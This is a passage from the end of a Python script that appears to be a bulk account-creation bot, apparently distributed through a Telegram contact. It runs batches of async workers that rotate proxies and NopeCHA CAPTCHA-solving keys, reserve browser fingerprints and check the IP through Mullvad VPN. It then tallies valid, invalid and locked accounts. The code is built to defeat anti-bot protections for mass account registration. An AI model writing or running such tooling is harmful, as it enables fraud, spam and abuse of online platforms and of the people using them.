        mins, secs = divmod(remaining, 60)
        print(f"\r{yellow}[BATCH] ➜ {reset}Next batch in: {cyan}{mins:02d}:{secs:02d}{reset} ", end='', flush=True)
        await asyncio.sleep(1)
    print()

async def runworkers():
    global sessiontarget, sessioncreated, sessionstop, proxylist
    
    all_proxies = loadproxies(config)
    with proxylistlock:
        proxylist = all_proxies if all_proxies else []
    
    while not sessionstop:
        with lock:
            if sessiontarget > 0 and sessioncreated >= sessiontarget:
                sessionstop = True
                break
        
        accounts_before = sessioncreated
        remaining = sessiontarget - sessioncreated if sessiontarget > 0 else threadcount
        batch_size = min(threadcount, remaining) if sessiontarget > 0 else threadcount
        
        if batch_size <= 0 and sessiontarget > 0:
            break
        
        tasks = []
        for i in range(batch_size):
            worker_id = random.randint(10000, 99999)
            current_proxy = getrandomproxy()
            rotatenopechakey()
            fingerprint = reservefingerprint()
            tasks.append(asyncio.create_task(worker(worker_id, current_proxy, fingerprint)))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        accounts_created = sessioncreated - accounts_before
        
        if sessiontarget > 0:
            if sessioncreated < sessiontarget:
                await batchcooldown(batch_size, accounts_created)
        else:
            await batchcooldown(batch_size, accounts_created)
        
        await asyncio.sleep(0.1)
    
    log.success(f"Completed! Created {sessioncreated} account(s)")

def showtamponbanner(ip: str = None, threads: int = None):
    info_line = "tg : @swiftplan_bot"
    if threads:
        info_line += f" | Threads : {threads}"
    if ip:
        info_line += f" | IP : {log.maskip(ip)}"
    
    banner = f"{info_line}"
    print(banner)

async def main():
    global sessiontarget
    
    current_ip = None

    if mullvadavailable:
        current_ip = mullvadgetip()
    else:
        try:
            current_ip = requests.get('https://api.ipify.org?format=text', timeout=8).text.strip()
        except:
            current_ip = None

    showtamponbanner(ip=current_ip, threads=threadcount)

    provider = config.get("email_provider", {}).get("name", "")
    
    sessiontarget = 0
    
    if sessiontarget == 0:
        pass
    else:
        pass
    print()
    
    downloadnopechaext()
    
    all_proxies = loadproxies(config)
    if all_proxies:
        pass
    else:
        pass
    
    try:
        await runworkers()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{yellow}Stopped{reset}")
    except Exception as e:
        log.error(f"Error: {e}")
    finally:
        stats = getaccountstats()
        if stats['total'] > 0:
            final_stats = f"{cyan}FINAL STATS{reset} | {green}Valid: {stats['valid']}{reset} | {red}Invalid: {stats['invalid']}{reset} | {yellow}Locked: {stats['locked']}{reset} | {green}Valid %: {stats['valid_percent']}{reset}"
            print(f"\n{final_stats}\n")